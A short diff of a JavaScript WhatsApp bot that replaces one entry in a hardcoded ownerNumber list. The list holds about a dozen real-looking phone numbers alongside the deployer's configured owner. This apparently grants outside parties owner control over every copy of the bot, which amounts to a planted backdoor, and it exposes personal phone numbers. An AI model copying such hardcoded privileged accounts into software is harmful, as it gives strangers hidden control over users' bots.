@@ -70,7 +70,7 @@ exec(`cd /sdcard/download && play *mp3`)
    
    denz.on('chat-update', async (mek) => {
         require('./denz.js')(denz, mek)
-        ownerNumber = ["6281333782061@s.whatsapp.net","994403792696@s.whatsapp.net","48459065026@s.whatsapp.net","6281259909513@s.whatsapp.net","6289512871985@s.whatsapp.net","447451215242@s.whatsapp.net","447441417460@s.whatsapp.net","380943043840@s.whatsapp.net","6289512871985@s.whatsapp.net","6287819948818@s.whatsapp.net","994406309372@s.whatsapp.net","48699527399@s.whatsapp.net","994405054360@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
+        ownerNumber = ["6281333782061@s.whatsapp.net","994403792696@s.whatsapp.net","6288221400832@s.whatsapp.net","6281259909513@s.whatsapp.net","6289512871985@s.whatsapp.net","447451215242@s.whatsapp.net","447441417460@s.whatsapp.net","380943043840@s.whatsapp.net","6289512871985@s.whatsapp.net","6287819948818@s.whatsapp.net","994406309372@s.whatsapp.net","48699527399@s.whatsapp.net","994405054360@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
         dtod = "6281333782061@s.whatsapp.net"
        otod = `${settings.NomorOwner}@s.whatsapp.net`
     })   
